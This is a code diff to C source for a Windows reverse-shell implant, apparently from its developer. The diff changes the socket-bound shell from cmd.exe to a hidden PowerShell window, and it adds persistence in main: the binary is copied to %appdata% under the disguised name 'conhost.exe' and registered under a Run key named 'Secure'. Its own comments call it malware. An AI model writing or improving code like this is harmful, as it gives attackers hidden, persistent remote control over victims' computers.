@@ -101,12 +101,13 @@ void beacon_connect_to_server(char IP[16], int PORT){
         sinfo.hStdOutput = (HANDLE)s;
         sinfo.hStdError = (HANDLE)s;
         PROCESS_INFORMATION pinfo;
-        CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+        char proc[] = "powershell.exe -WindowStyle Hidden";
+        CreateProcessA(NULL, proc, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
         WaitForSingleObject(pinfo.hProcess, INFINITE);
         CloseHandle(pinfo.hProcess);
         CloseHandle(pinfo.hThread);
         memset((void *) s, 0, sizeof(s));
-        printf("HELP");
+
     }
     
     
@@ -127,6 +128,8 @@ int main(int argc, char *argv[]) {
         char IP [16]; strcpy(IP, argv[1]);
         int PORT = atoi(argv[2]);
         //printf("asasasasasa");
+        system("cmd /c copy .\\conhost.exe %appdata%");  // copy malware to appdata
+        system("cmd /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Secure\" /t REG_SZ /F /D \"%appdata%\\conhost.exe"); //add registry persistence 
         beacon_connect_to_server(IP, PORT);
     }
     else if( argc > 3 ) {
